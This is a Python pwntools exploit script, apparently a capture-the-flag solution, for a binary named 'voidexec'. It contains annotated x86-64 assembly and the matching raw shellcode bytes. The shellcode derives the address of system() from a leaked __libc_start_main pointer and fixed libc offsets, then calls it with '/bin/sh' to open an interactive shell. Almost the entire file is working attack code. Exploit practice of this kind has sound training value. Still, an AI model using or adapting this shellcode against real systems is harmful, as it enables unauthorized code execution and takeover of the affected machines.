#!/usr/bin/env python3

from pwn import *

exe = ELF("./voidexec_patched")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-linux-x86-64.so.2", False)

context.binary = exe

gdb_script = '''
b *main+197
b *forbidden+153
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    assembly = '''
	mov eax, dword [rsp+0x20] ; load __libc_start_main addr from stack
	mov edx, dword [rsp+0x24] 
	
	mov rdi, rdx
	shl rdi, 32
	or  rdi, rax ; save __libc_start_main addr at rdi
	
	; calculate libc offset 
	sub rdi, 0x80
	sub rdi, 0x29d10 ; sub __libc_start_main offset
	add rdi, 0x50d70 ; calculate system function addr in libc
	
	; prepare system parameters
	mov rax, 0x0068732f6e69622f
	push rax
	
	xor rax, rax
	mov rax, rdi
	mov rdi, rsp
	
	; call rax (system)
	call rax
    '''
    
    shellcode = b"\x8B\x44\x24\x20\x8B\x54\x24\x24\x48\x89\xD7\x48\xC1\xE7\x20\x48\x09\xC7\x48\x81\xEF\x80\x00\x00\x00\x48\x81\xEF\x10\x9D\x02\x00\x48\x81\xC7\x70\x0D\x05\x00\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x31\xC0\x48\x89\xF8\x48\x89\xE7\xFF\xD0"
    
    r.sendline(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
